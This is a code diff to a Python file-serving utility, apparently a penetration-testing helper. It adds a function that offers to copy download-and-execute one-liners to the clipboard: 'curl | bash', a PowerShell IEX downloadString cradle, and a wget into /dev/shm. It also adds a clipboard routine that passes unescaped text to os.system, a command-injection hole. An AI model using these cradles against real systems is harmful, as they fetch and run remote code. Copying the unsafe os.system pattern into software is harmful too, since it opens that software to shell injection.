@@ -25,12 +25,15 @@ from http import HTTPStatus
 
 from binaryornot.check import is_binary
 
-# Default error message template
 from core.config import eval_index, get_index
 from core.constants import DEFAULT_PORT
-from core.log import log_normal, set_global_verbose, log_verbose, YELLOW, NO_COLOR, log_error, is_verbose_mode
+from core.log import log_normal, set_global_verbose, log_verbose, YELLOW, NO_COLOR, log_error, is_verbose_mode, ask, \
+    log_success
 from core.ssl_util import cert_gen
 from core.util import get_available_port
+
+
+# Default error message template
 
 
 class HTTPServer(socketserver.TCPServer):
@@ -564,6 +567,24 @@ class CORSRequestHandler(SimpleHTTPRequestHandler):
         SimpleHTTPRequestHandler.end_headers(self)
 
 
+def copy(text):
+    command = 'echo \'' + text.strip() + '\' | xclip -r -sel clip'
+    os.system(command)
+
+
+def check_copy(index, address):
+    if index.endswith(".sh"):
+        copy_str = f"curl -k -s {address} | bash"
+    elif index.endswith(".ps1"):
+        copy_str = f"IEX(New-Object Net.Webclient).downloadString('{address}')"
+    else:
+        copy_str = f"wget {address} -O /dev/shm/{os.path.basename(index)}"
+
+    if copy_str and ask(f"Copy '{copy_str}' to clipboard? "):
+        copy(copy_str)
+        log_success("Copied ✔️")
+
+
 def start(port, bind, index, use_ssl):
     server_class = DualStackServer
     protocol = "HTTP/1.0"
@@ -577,8 +598,12 @@ def start(port, bind, index, use_ssl):
 
     server_class.address_family, addr = _get_best_family(bind, port)
 
+    address = f"http{'s' if use_ssl else ''}://{bind}:{port}"
     log_normal(
-        f"🚀 Serving {YELLOW + os.path.abspath(index) + NO_COLOR} at http{'s' if use_ssl else ''}://{bind}:{port}")
+        f"🚀 Serving {YELLOW + os.path.abspath(index) + NO_COLOR} at {address}")
+
+    if os.path.isfile(index):
+        check_copy(index, address)
 
     HandlerClass = partial(CORSRequestHandler,
                            index=index, replacers=replacers)
